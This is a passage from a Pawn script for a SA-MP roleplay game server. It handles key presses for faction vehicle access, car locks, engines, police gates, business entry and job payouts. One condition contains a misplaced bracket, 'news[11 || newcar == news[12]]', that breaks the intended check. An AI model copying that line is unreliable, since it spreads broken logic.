		if(newcar == admincars[1] || newcar == admincars[2] || newcar == admincars[3] || newcar == admincars[4] || newcar == admincars[5])
		{
		    if(PlayerInfo[playerid][pAdmin] >= 1) { }
		    else
			{
		        SendClientMessage(playerid, COLOR_SERVER,"{999999}You are not a Admin.");
		        ClearAnimations(playerid);
		    }
		}
		if(newcar == si[1] || newcar == si[2] || newcar == si[3] || newcar == si[4] || newcar == si[5] || newcar == si[6] || newcar == si[7] || newcar == si[8] || newcar == si[9] || newcar == si[10] || newcar == si[11] || newcar == si[12] || newcar == si[13])
		{
		    if(PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pLeader] == 12 || TakingLesson[playerid] == 2) { }
		    else
			{
		        SendClientMessage(playerid, COLOR_SERVER,"{999999}You are not a School Instructors or your don't have active leasson.");
		        ClearAnimations(playerid);
		    }
		}
		if(newcar == si[12] || newcar == si[13])
		{
		    if(PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pLeader] == 12)
		    {
		        if(PlayerInfo[playerid][pRank] < 2)
		        {
		        	SendClientMessage(playerid, COLOR_SERVER,"{999999}You don't have rank 2.");
		        	ClearAnimations(playerid);
		        }
		    }
		}
		if(newcar == news[16] || newcar == news[17])
		{
		    if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9)
		    {
		        if(PlayerInfo[playerid][pRank] < 4)
		        {
		        	SendClientMessage(playerid, COLOR_SERVER,"{999999}You don't have rank 4.");
		        	ClearAnimations(playerid);
		        }
		    }
		}
		if(newcar == farm[1] || newcar == farm[2] || newcar == farm[3] || newcar == farm[4] || newcar == farm[5] || newcar == farm[6] || newcar == farm[7] || newcar == farm[8] || newcar == farm[9] || newcar == farm[10]
		|| newcar == farm[11] || newcar == farm[12] || newcar == farm[13])
		{
		    KillTimer(timerfarmm[playerid]);
		    if(AreFaina[playerid] < 1)
		    {
				if(PlayerInfo[playerid][pJob] == 6) { }
    			else
				{
   					SendClientMessage(playerid, COLOR_SERVER, "{999999}You are not a Farmer.");
			    	ClearAnimations(playerid);
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_YELLOW, "Vinde faina inainte de a munci din nou.");
			    ClearAnimations(playerid);
			}
		}
		if(newcar == news[1] || newcar == news[2] || newcar == news[3] || newcar == news[4] || newcar == news[5] || newcar == news[6] || newcar == news[7] || newcar == news[8] || newcar == news[9] || newcar == news[10]
		|| newcar == news[11 || newcar == news[12]] || newcar == news[13] || newcar == news[14] || newcar == news[15] || newcar == news[16] || newcar == news[17])
		{
			if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9){ }
			else
			{
			    SendClientMessage(playerid, COLOR_SERVER,"{999999}You are not a News Reporter !");
			    ClearAnimations(playerid);
			}
		}
   }
   if((IsACBUGWeapon(playerid) && RELEASED(KEY_FIRE)) && newkeys != KEY_FIRE && newkeys & KEY_CROUCH)
   {
       ApplyAnimation ( playerid , "PED" , "getup" , 4.1 , 0 , 0 , 0 , 0 , 0 ) ;
       SCM(playerid,COLOR_SERVER,"{AA3333}Pe serverul nostru este interzis c-bug, risti ban 3 zile.");
   }
   if (newkeys & KEY_NO)
   {
        if(SwitchKey[playerid] == 1)
        {
			new string[100];
			for(new v=0; v<=MAX_PVEHS; v++)
			{
                if(v == 15) { return 1; }
   				if(CheckPlayerDistanceToVehicle(5.0, playerid, personalcar[v][playerid]))
				{
	 				if(CarInfo[OwnedVeh(personalcar[v][playerid])][cLock] == 1)
		  			{
   						GetVehicleParamsEx(personalcar[v][playerid],engine,lights,alarm,doors,bonnet,boot,objective);
	  	    			SetVehicleParamsEx(personalcar[v][playerid],engine,lights,alarm,0,bonnet,boot,objective);
						format(string, sizeof(string), "~h~%s~n~~g~Unlocked",CarInfo[OwnedVeh(personalcar[v][playerid])][cDescription]);
						GameTextForPlayer(playerid, string, 4000, 4);
						PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
						CarInfo[OwnedVeh(personalcar[v][playerid])][cLock] = 0;
						gCarLock[personalcar[v][playerid]] = 0;
						vUpdate(OwnedVeh(personalcar[v][playerid]), cLockx); //
						return 1;
					}
					else if(CarInfo[OwnedVeh(personalcar[v][playerid])][cLock] == 0)
					{
 						GetVehicleParamsEx(personalcar[v][playerid],engine,lights,alarm,doors,bonnet,boot,objective);
	    				SetVehicleParamsEx(personalcar[v][playerid],engine,lights,alarm,1,bonnet,boot,objective);
						format(string, sizeof(string), "~h~%s~n~~r~Locked",CarInfo[OwnedVeh(personalcar[v][playerid])][cDescription]);
						GameTextForPlayer(playerid, string, 4000, 4);
						PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
						CarInfo[OwnedVeh(personalcar[v][playerid])][cLock] = 1;
						gCarLock[personalcar[v][playerid]] = 1;
						vUpdate(OwnedVeh(personalcar[v][playerid]), cLockx); //
     					return 1;
					}
				}
			}
			return 1;
        }
        else if(SwitchKey[playerid] == 2)
		{
		    new carid,string[128];
			if(HireCar[playerid] == -1) return 1;
		    if(HireCar[playerid] != -1)
		    {
				carid = HireCar[playerid];
			}
            if(CheckPlayerDistanceToVehicle(5.0, playerid, HireCar[playerid]))
			{
			    if(gCarLock[carid] == 0)
		        {
			        new vehicles = GetVehicleModel(carid) - 400;
				    format(string, sizeof(string), "~h~%s~n~~r~Locked", aVehicleNames[vehicles]);
				    GameTextForPlayer(playerid, string, 4000, 4);
		  	        PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
					gCarLock[carid] = 1;
	    			GetVehicleParamsEx(HireCar[playerid],engine,lights,alarm,doors,bonnet,boot,objective);
	      	    	SetVehicleParamsEx(HireCar[playerid],engine,lights,alarm,1,bonnet,boot,objective);
		            return 1;
			    }
				else if(gCarLock[carid] == 1)
				{
					new vehicles = GetVehicleModel(carid) - 400;
					format(string, sizeof(string), "~h~%s~n~~g~Unlocked", aVehicleNames[vehicles]);
				    GameTextForPlayer(playerid, string, 4000, 4);
					PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
					gCarLock[carid] = 0;
	    			GetVehicleParamsEx(HireCar[playerid],engine,lights,alarm,doors,bonnet,boot,objective);
	      	    	SetVehicleParamsEx(HireCar[playerid],engine,lights,alarm,0,bonnet,boot,objective);
		            return 1;
				}
			}
		}
	}
   if (newkeys & KEY_HANDBRAKE)
   {
       if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK && PlayerInfo[playerid][pAdmin] < 1)
	   {
		   new string[256];
		   format(string, sizeof(string), "{0000ff}[Anti-Cheat]:{FFFFFF} %s (%d, level %d) created a jetpack.",GetName(playerid),playerid,PlayerInfo[playerid][pLevel]);
		   ABroadCast(COLOR_RED,string,1);
	   }
   }
   if (newkeys & KEY_CROUCH)
   {
       if(PlayerToPoint(10.0, playerid,907.50238, -1666.58813, 13.50640))
       {
			if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
			{
			    MoveObject(gatehqa, 907.46240, -1666.58813, 13.40640, 2, -0.04000, -2.32000, -90.00000);
        		//MoveObject(gatehqa,1596.7352,-1637.9025, 15.0358, 2 , 0.00000, 0.00000, -90.84000);
            	SetTimer("gateadminclose" ,5000 ,false);
			}
       }
	   if(IsACop(playerid))
       {

       }
       if(IsACop(playerid))
       {
		   if(PlayerToPoint(15.0, playerid,1588.6552, -1637.9025, 15.0358))
           {
               MoveObject(gatelspd,1592.65674, -1638.05286, 9.89110,2, -1000.0, -1000.0, -1000.0);
               SetTimer("lspdgateclose" ,9000 ,false);
               return 1;
           }
           if(PlayerToPoint(15.0, playerid,2334.8999000, 2444.3999000, 8.3000000))
           {
               MoveDynamicObject(gatelvpd,2339.3000000, 2450.5000000, 8.3000000,2, -1000.0, -1000.0, -1000.0);
               SetTimer("lvpdgateclose" ,9000 ,false);
               return 1;
           }
           if(PlayerToPoint(15.0, playerid,2295.3000000, 2507.0000000, 5.7000000))
           {
               MoveDynamicObject(gatelvpd2,2295.3000000, 2507.0000000, 5.7000000,2, -1000.0, -1000.0, -1000.0);
               SetTimer("lvpdgateclose2" ,9000 ,false);
               return 1;
           }
		   if(PlayerToPoint(15.0, playerid,135.2833, 1941.3331, 21.6932))
           {
               MoveDynamicObject(gateng,122.0023, 1941.4100, 21.6932,2, -1000.0, -1000.0, -1000.0);
               SetTimer("nggateclose" ,9000 ,false);
               return 1;
           }
		   if(PlayerToPoint(15.0, playerid,1544.7007, -1630.7527, 13.2983))
           {
               MoveDynamicObject(lspdbar,1544.7007, -1630.7527, 13.2983,1,0.0000, 0.0000, 90.0000);
               SetTimer("lspdbarclose" ,9000 ,false);
               return 1;
           }
           if(PlayerToPoint(15.0, playerid,2238.22021, 2450.44312, 10.58781))
           {
               MoveDynamicObject(lvpdbar,2238.22021, 2450.44312, 10.58781,1,0.0000, 0.0000, 90.0000);
               SetTimer("lvpdbarclose" ,9000 ,false);
               return 1;
           }
	   }
   }
   if (((newkeys & KEY_WALK && newkeys & KEY_UP) || (newkeys & KEY_WALK && newkeys & KEY_DOWN) || (newkeys & KEY_WALK && newkeys & KEY_LEFT) || (newkeys & KEY_WALK && newkeys & KEY_RIGHT))
   || ((oldkeys & KEY_WALK && newkeys & KEY_UP) || (oldkeys & KEY_WALK && newkeys & KEY_DOWN) || (oldkeys & KEY_WALK && newkeys & KEY_LEFT) || (oldkeys & KEY_WALK && newkeys & KEY_RIGHT))
   || ((newkeys & KEY_WALK && oldkeys & KEY_UP) || (newkeys & KEY_WALK && oldkeys & KEY_DOWN) || (newkeys & KEY_WALK && oldkeys & KEY_LEFT) || (newkeys & KEY_WALK && oldkeys & KEY_RIGHT))
   && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
   {
		walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
   }
   if(newkeys == KEY_LOOK_BEHIND)
   {
	   if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	   {
		   new idcar = GetPlayerVehicleID(playerid),string[128],sendername[25];
		   if(IsABike(idcar) || IsAPlane(idcar)) return 1;
		   if(Refueling[playerid] == 0)
	  	   {
     	       if(vehEngine[idcar] == 0)
        	   {
				   vehEngine[idcar] = 1;
	               GetVehicleParamsEx(idcar,engine,lights,alarm,doors,bonnet,boot,objective);
	               SetVehicleParamsEx(idcar,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
	               new vehicle;
	               vehicle = GetVehicleModel(idcar) - 400;
	    		   GetPlayerName(playerid, sendername, sizeof(sendername));
	               SetPVarInt(playerid, "Engine", 1);
	               if(Undercover[playerid] != 0)
	               {
	                   format(string,sizeof(string),"* An unknown hitman starts the engine of his %s.",aVehicleNames[vehicle]);
		               ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	               }
	               else
	               {
		               format(string,sizeof(string),"* %s starts the engine of his %s.",sendername,aVehicleNames[vehicle]);
		               ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				   }
        	   }
      	  	   else if(vehEngine[idcar] == 1)
        	   {
    			   vehEngine[idcar] = 0;
    			   GetVehicleParamsEx(idcar,engine,lights,alarm,doors,bonnet,boot,objective);
      	    	   SetVehicleParamsEx(idcar,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
            	   new vehicle;
            	   vehicle = GetVehicleModel(idcar) - 400;
	        	   GetPlayerName(playerid, sendername, sizeof(sendername));
            	   SetPVarInt(playerid, "Engine", 0);
            	   if(Undercover[playerid] != 0)
            	   {
	                   format(string,sizeof(string),"* An unknown hitman stops the engine of his %s.",aVehicleNames[vehicle]);
	            	   ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            	   }
            	   else
            	   {
	            	   format(string,sizeof(string),"* %s stops the engine of his %s.",sendername,aVehicleNames[vehicle]);
	            	   ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				   }
        	   }
	       }
		   else return SendClientMessage(playerid,COLOR_SERVER,"{999999}Please wait, you refill your vehicle.");
	   }
   }
   if (newkeys & KEY_SPRINT)
   {
       if(gPlayerUsingLoopingAnim[playerid] == 1)
       {
	       StopLoopingAnim(playerid);
       }
   }
   if (newkeys & KEY_ANALOG_DOWN)
   {
      if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
      {
         if(GetPVarInt(playerid, "Boot") == 0)
         {
			 GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
			 SetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,VEHICLE_PARAMS_ON,objective);
			 SetPVarInt(playerid, "Boot", 1);
         }
         else if(GetPVarInt(playerid, "Boot") == 1)
         {
			 GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
			 SetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,VEHICLE_PARAMS_OFF,objective);
			 SetPVarInt(playerid, "Boot", 0);
         }
      }
      return 1;
   }
   if (newkeys & KEY_SECONDARY_ATTACK)
   {
	   new string[300];
	   if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	   {
		   if(IsPlayerConnected(playerid))
		   {
			   if(BusinessRob[playerid] == 3) return SendClientMessage(playerid, COLOR_ROB, "You must wait 10 seconds to rob the business.");
			   for(new i = 1; i < sizeof(HouseInfo); i++)
			   {
				   if(IsPlayerInRangeOfPoint(playerid,2,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]) && GetPlayerVirtualWorld(playerid) == 0)
				   {
					   if(PlayerInfo[playerid][pPhousekey] == i || PlayerInfo[playerid][pPhousekey2] == i || HouseInfo[i][hLock] == 0)
					   {
						   SetPlayerInterior(playerid,HouseInfo[i][hInterior]);
						   SetPlayerPosEx(playerid,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz]);
						   GameTextForPlayer(playerid, "~w~Welcome Home", 5000, 1);
						   PlayerInfo[playerid][pInt] = HouseInfo[i][hInterior];
						   PlayerInfo[playerid][pLocal] = i;
						   SetPlayerVirtualWorld(playerid,HouseInfo[i][hVirtual]);
						   InHouse[playerid] = i;
						   TogglePlayerControllable(playerid, 0);
						   bugobiecte[playerid] = 5;
						   GameTextForPlayer(playerid, "~w~You have been blocked ~r~5 seconds ~w~for loading objects.", 3000, 4);
						   if(strlen(housestring[InHouse[playerid]]) > 0)
						   {
			   			       if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
	    				       PlayAudioStreamForPlayer(playerid, housestring[InHouse[playerid]]);
						   }
					   }
					   else
					   {
						   GameTextForPlayer(playerid, "~r~~h~Locked", 5000, 1);
					   }
				   }
			   }
			   for(new i = 1; i < sizeof(BizzInfo); i++)
			   {
				   if (IsPlayerInRangeOfPoint(playerid,2,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]))
				   {
					   if(BizzInfo[i][bSbiz] != 0) return 0;
					   if(GetPlayerCash(playerid) >= BizzInfo[i][bEntranceCost])
					   {
						   if(BizzInfo[i][bLocked] == 1)
						   {
							   GameTextForPlayer(playerid, "~r~~h~Closed", 5000, 1);
							   return 1;
						   }
						   if(LastBiz[playerid] != i)
						   {
							   GivePlayerCash(playerid,-BizzInfo[i][bEntranceCost]);
							   BizzInfo[i][bTill] += BizzInfo[i][bEntranceCost];
							   format(string,sizeof(string),"~r~-$%d",BizzInfo[i][bEntranceCost]);
							   GameTextForPlayer(playerid, string, 5000, 1);
						   }
						   else
						   {
							   GameTextForPlayer(playerid, "welcome back", 5000, 1);
						   }
						   LastBiz[playerid] = i;
						   if(BizzInfo[i][bType] == 3)
						   {
							   if(strlen(barstring[i][playerid]) > 0)
							   {
									if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
									PlayAudioStreamForPlayer(playerid, barstring[i]);
							   }
						   }
						   if(BizzInfo[i][bType] == 1)
						   {
                               SCM(playerid,COLOR_GREEN,"Scams (Tepe) are not allowed on the server. Any attempt to trick a player of goods / money you can receive a permanent ban.");
                               SCM(playerid,COLOR_GREEN,"Loans of any kind (including debts) are their own responsibility. You have no guarantee that he'll recover.");
                               SCM(playerid,COLOR_GREEN,"Businesses with real money are not allowed. The complete ban 7-14 days for the first offense and permanent ban from the next offense.");
					           SCM(playerid,COLOR_SERVER,"Welcome! The commands of this business are as follows: /deposit, /withdraw, /balance, /transfer");
						   }
						   else if(BizzInfo[i][bType] == 2)
						   {
					           SCM(playerid,COLOR_SERVER,"Welcome to the gun shop! The commands of this business are as follows: /buygun");
						   }
						   else if(BizzInfo[i][bType] == 3)
						   {
					           SCM(playerid,COLOR_SERVER,"Welcome! The commands of this business are as follows: /buydrink");
						   }
						   else if(BizzInfo[i][bType] == 4)
						   {
					           SCM(playerid,COLOR_SERVER,"Welcome to the sex shop! The commands of this business are as follows: /buytoys");
						   }
						   else if(BizzInfo[i][bType] == 5)
						   {
					           SCM(playerid,COLOR_SERVER,"Welcome! The commands of this business are as follows: /dice");
					           //SCM(playerid,COLOR_SERVER,"Pentru a juca jocul 'Keno Universe' tasteaza comanda /play");
						   }
						   else if(BizzInfo[i][bType] == 6)
						   {
								SCM(playerid,COLOR_SERVER,"Welcome! The commands of this business are as follows: /buy");
								if(PlayerInfo[playerid][pFishPrice] != 0)
								{
									ShowPlayerDialog(playerid, DIALOG_SELLFISH, DIALOG_STYLE_MSGBOX, "Sell fish", "Do you want to sell the fish you are carying?", "Yes", "No");
								}
						   }
						   else if(BizzInfo[i][bType] == 7 || BizzInfo[i][bType] == 14)
						   {
					           SCM(playerid,COLOR_SERVER,"Welcome! The commands of this business are as follows: /buyfood");
							   if(AreFaina[playerid] > 0)
						        {
						        	new money,faina = AreFaina[playerid];
		       						if(PlayerInfo[playerid][pFarmSkill] == 1)
						       		{
										money = 7000 + faina*1500;
									}
									else if(PlayerInfo[playerid][pFarmSkill] == 2)
						       		{
										money = 10000 + faina*1500;
									}
									else if(PlayerInfo[playerid][pFarmSkill] == 3)
						       		{
										money = 14000 + faina*1500;
									}
									else if(PlayerInfo[playerid][pFarmSkill] == 4)
						       		{
										money = 16000 + faina*1500;
									}
									else if(PlayerInfo[playerid][pFarmSkill] == 5)
						       		{
										money = 18000 + faina*1500;
									}
									else if(PlayerInfo[playerid][pFarmSkill] >= 6)
						       		{
										money = 20000 + faina*1500;
									}
									PlayerInfo[playerid][pFarmTimes]++;
									PlayerInfo[playerid][pFarmRem]--;
									AreFaina[playerid] = 0;
									GivePlayerCash(playerid, money);
									Update(playerid, pCashx);
									Update(playerid, pFarmTimesx);
									Update(playerid, pFarmRemx);
									if(PlayerInfo[playerid][pFarmSkill] <= 5)
									{
										if(PlayerInfo[playerid][pFarmRem] <= 0)
										{
			    							PlayerInfo[playerid][pFarmSkill]++;
			    							if(PlayerInfo[playerid][pFarmSkill] == 2)
											{
												PlayerInfo[playerid][pFarmRem] = 34;
											}
											else if(PlayerInfo[playerid][pFarmSkill] == 3)
											{
												PlayerInfo[playerid][pFarmRem] = 49;
											}
											else if(PlayerInfo[playerid][pFarmSkill] == 4)
											{
												PlayerInfo[playerid][pFarmRem] = 89;
											}
											else if(PlayerInfo[playerid][pFarmSkill] == 5)
											{
												PlayerInfo[playerid][pFarmRem] = 99;
											}
		    								Update(playerid,pFarmSkillx);
		    								Update(playerid,pFarmRemx);
			    							format(string,sizeof(string),"Congratulations! You now have skill %d for this job!",PlayerInfo[playerid][pFarmSkill]);
			    							SendClientMessage(playerid, COLOR_YELLOW, string);
										}
									}
									format(string,sizeof(string),"(+) You sold a bag of flour $%s.", FormatNumber(money));
									SendClientMessage(playerid, COLOR_GREEN, string);
								}
						   }
						   else if(BizzInfo[i][bType] == 8)
						   {
					           SCM(playerid,COLOR_SERVER,"Welcome! The commands of this business are as follows: /buyfightstyle");
						   }
						   else if(BizzInfo[i][bType] == 9)
						   {
					           SCM(playerid,COLOR_SERVER,"Welcome! The commands of this business are as follows: /buyfood");
						   }
						   else if(BizzInfo[i][bType] == 11)
						   {
					           SCM(playerid,COLOR_SERVER,"Welcome! The commands of this business are as follows: /buyglasses ($5000), /buyclothes, /clothes, /buyhat ($5000)");
						   }
						   SetPlayerInterior(playerid,BizzInfo[i][bInterior]);
						   SetPlayerPosEx(playerid,BizzInfo[i][bExitX],BizzInfo[i][bExitY],BizzInfo[i][bExitZ]);
						   TogglePlayerControllable(playerid, 0);
						   bugobiecte[playerid] = 1;
						   PlayerInfo[playerid][pInt] = BizzInfo[i][bInterior];
						   PlayerInfo[playerid][pLocal] = i+99;
	                       SetPlayerVirtualWorld(playerid,BizzInfo[i][bVirtual]);
						   InBussines[playerid] = i;
						   Update(playerid, pCashx);
			               new str1[184];
						   mysql_format(SQL,str1,sizeof(str1),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[i][bTill],i);
						   mysql_tquery(SQL,str1,"","");
					   }
					   else
					   {
						   GameTextForPlayer(playerid, "~r~~h~You dont have the cash", 5000, 1);
					   }
				   }
			   }
			   if(IsPlayerInRangeOfPoint(playerid,2,893.71094, -1636.59204, 14.72620)) // hq staff
			   {
				   if(PlayerInfo[playerid][pAdmin] < 1) return SCM(playerid, COLOR_SERVER, AdminOnly);
				   SetPlayerInterior(playerid, 5);
				   SetPlayerPosEx(playerid, 1267.663208,-781.323242,1091.906250);
				   SetPlayerVirtualWorld(playerid, 696969);
				   PlayerInfo[playerid][pInt] = 5;
			   }
			   else if(IsPlayerInRangeOfPoint(playerid,2,1262.1661,-785.6332,1091.9063) && GetPlayerVirtualWorld(playerid) == 696969) // hq staff
			   {
				   SetPlayerInterior(playerid, 0);
				   SetPlayerPosEx(playerid, 893.71094, -1636.59204, 14.72620);
				   SetPlayerVirtualWorld(playerid, 0);
				   PlayerInfo[playerid][pInt] = 0;
			   }
			   else if (IsPlayerInRangeOfPoint(playerid,1,1552.5898,-1683.4698,13.5504) && Vending[playerid] == 0 && GetPlayerVirtualWorld(playerid) == 0) // dozator
			   {
			      	if(GetPlayerCash(playerid) < 200) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have money needed.");
					new sendername[MAX_PLAYER_NAME];
					GetPlayerName(playerid, sendername, sizeof(sendername));
        			ApplyAnimation(playerid, "VENDING", "VEND_USE", 4.0, 0, 0, 0, 0, 0);
           			PlayerPlaySound(playerid, 42600, 0.0, 0.0, 0.0);
           			SetPlayerFacingAngle(playerid, 272.63);
              		GameTextForPlayer(playerid, "~r~-200$", 5000, 1);
                	GivePlayerCash(playerid, -200);
					Update(playerid,pCashx);
					Vending[playerid] = 1;
					vendi[playerid] = SetTimerEx("Vendingg", 6000, 0, "i", playerid);
					vendi2[playerid] = SetTimerEx("Vendingg2", 2300, 0, "i", playerid);
					format(string, sizeof(string), "* %s bought a drink from vending machine.", sendername);
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			   }
			   else if (IsPlayerInRangeOfPoint(playerid,1,2273.5654,2428.7834,10.8203) && Vending[playerid] == 0) // dozator
			   {
					if(GetPlayerCash(playerid) < 200) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have money needed.");
					new sendername[MAX_PLAYER_NAME];
					GetPlayerName(playerid, sendername, sizeof(sendername));
        			ApplyAnimation(playerid, "VENDING", "VEND_USE", 4.0, 0, 0, 0, 0, 0);
           			PlayerPlaySound(playerid, 42600, 0.0, 0.0, 0.0);
           			SetPlayerFacingAngle(playerid, 272.63);
              		GameTextForPlayer(playerid, "~r~-200$", 5000, 1);
                	GivePlayerCash(playerid, -200);
					Update(playerid,pCashx);
					Vending[playerid] = 1;
					vendi[playerid] = SetTimerEx("Vendingg", 6000, 0, "i", playerid);
					vendi2[playerid] = SetTimerEx("Vendingg2", 2300, 0, "i", playerid);
					format(string, sizeof(string), "* %s bought a drink from vending machine.", sendername);
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			   }
			   else if (IsPlayerInRangeOfPoint(playerid,2,1090.7542,-1476.3380,22.7465)) //tatto
			   {
			       SetPlayerInterior(playerid,16);
				   SetPlayerPosEx(playerid,-204.439987,-26.453998,1002.273437);
				   GameTextForPlayer(playerid, "~r~Tatto", 5000, 1);
				   PlayerInfo[playerid][pInt] = 16;
			   }
			   else if (IsPlayerInRangeOfPoint(playerid,2,1765.1732,-1569.0253,1742.4930)) // enter visit
			   {
				   SetPlayerPosEx(playerid,1764.3419,-1567.7599,1742.4967);
			   }
			   else if (IsPlayerInRangeOfPoint(playerid,2,2166.4771,-1671.7883,15.0743)) // drugs house
			   {
	               SetPlayerInterior(playerid,5);
				   SetPlayerPosEx(playerid,318.5867,1115.4735,1083.8828);
				   PlayerInfo[playerid][pInt] = 5;
			   }
			   else if (IsPlayerInRangeOfPoint(playerid,2,648.18,-1352.61,14.25)) //nr
			   {
			       if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9)
			       {
				       SetPlayerInterior(playerid,3);
					   SetPlayerPosEx(playerid,-1778.37,-3546,338.43);
					   PlayerInfo[playerid][pInt] = 3;
					   InHQ[playerid] = 9;
				   }
			   }
			   else if (IsPlayerInRangeOfPoint(playerid,2,2435.3064,1671.0139,10.8203)) //SI
			   {
			       if(PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pLeader] == 12)
			       {
				       SetPlayerInterior(playerid,3);
					   SetPlayerPosEx(playerid,1494.2838,1304.3364,1093.2891);
					   PlayerInfo[playerid][pInt] = 3;
					   SetPlayerVirtualWorld(playerid, 3);
					   InHQ[playerid] = 12;
				   }
			   }
			   else if (IsPlayerInRangeOfPoint(playerid,2,1081.1794,-345.3979,73.9825))//hitman
			   {
			       if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11)
			       {
				       SetPlayerInterior(playerid,12);
					   SetPlayerPosEx(playerid,2323.9993,-1148.0469,1050.7101);
					   PlayerInfo[playerid][pInt] = 12;
					   InHQ[playerid] = 11;
					   SetPlayerVirtualWorld(playerid, 2);
				   }
			   }
			   else if (IsPlayerInRangeOfPoint(playerid,2,1754.3792,-1894.0465,13.5569)) //LS TAXI
			   {
			       if(PlayerInfo[playerid][pMember] == 13 || PlayerInfo[playerid][pLeader] == 13)
			       {
				       SetPlayerInterior(playerid,18);
					   SetPlayerPosEx(playerid,1700.9830,-1667.8865,20.2188);
					   PlayerInfo[playerid][pInt] = 18;
					   SetPlayerVirtualWorld(playerid, 5);
					   InHQ[playerid] = 13;
				   }
			   }
			   else if (IsPlayerInRangeOfPoint(playerid,2,1614.92480, 1816.09631, 10.91310)) //fireman / paramedic
			   {
			       if(PlayerInfo[playerid][pMember] == 14 || PlayerInfo[playerid][pLeader] == 14)
			       {
				       SetPlayerInterior(playerid,3);
					   SetPlayerPosEx(playerid,1494.2838,1304.3364,1093.2891);
					   PlayerInfo[playerid][pInt] = 3;
					   SetPlayerVirtualWorld(playerid, 7);
					   InHQ[playerid] = 14;
				   }
			   }
			   else if (IsPlayerInRangeOfPoint(playerid,2,2307.2935,-1786.0671,13.5557)) // b'dub house
			   {
			       SetPlayerInterior(playerid,3);
				   SetPlayerPosEx(playerid,1527.229980,-11.574499,1002.097106);
			       GameTextForPlayer(playerid, "~w~B'Dub House", 5000, 1);
				   PlayerInfo[playerid][pInt] = 3;
			   }
			   else if (IsPlayerInRangeOfPoint(playerid,2,157.3923,1903.2848,18.6660)) // armoury NG
			   {
	               if (IsACop(playerid))
	               {
			           SetPlayerInterior(playerid,10);
			    	   SetPlayerPosEx(playerid,246.5872,109.0304,1003.2188);
			    	   GameTextForPlayer(playerid, "~w~National Guard Armoury", 5000, 1);
			    	   PlayerInfo[playerid][pInt] = 10;
			    	   SetPlayerVirtualWorld(playerid, 4);
			    	   InHQ[playerid] = 3;
		    	   }
		       }
			   else if (IsPlayerInRangeOfPoint(playerid,2,242.8626,66.2978,1003.6406) && GetPlayerVirtualWorld(playerid) == 0) // lspd armoury
			   {
	               if (!IsACop(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a cop.");
	               {
			           SetPlayerInterior(playerid,3);
			           SetPlayerVirtualWorld(playerid,333);
			    	   SetPlayerPosEx(playerid,288.8405,167.7809,1007.1719);
			    	   GameTextForPlayer(playerid, "~w~LSPD Staff HQ", 5000, 1);
			    	   PlayerInfo[playerid][pInt] = 3;
			    	   InHQ[playerid] = 1;
		    	   }
		       }
		       else if (IsPlayerInRangeOfPoint(playerid,2,242.8626,66.2978,1003.6406) && GetPlayerVirtualWorld(playerid) == 3) // lvpd armoury
			   {
	               if (!IsACop(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a cop.");
	               {
			           SetPlayerInterior(playerid,3);
			           SetPlayerVirtualWorld(playerid,343);
			    	   SetPlayerPosEx(playerid,288.8405,167.7809,1007.1719);
			    	   GameTextForPlayer(playerid, "~w~LVPD Staff HQ", 5000, 1);
			    	   PlayerInfo[playerid][pInt] = 3;
			    	   InHQ[playerid] = 1;
		    	   }
		       }
			   /*else if (IsPlayerInRangeOfPoint(playerid,2,1481.1063,-1771.2532,18.7958))
			   {
			       SetPlayerInterior(playerid,3);
				   SetPlayerPosEx(playerid,387.7978,173.8582,1008.3828);
				   GameTextForPlayer(playerid, "~w~Welcome to the City Hall", 5000, 1);
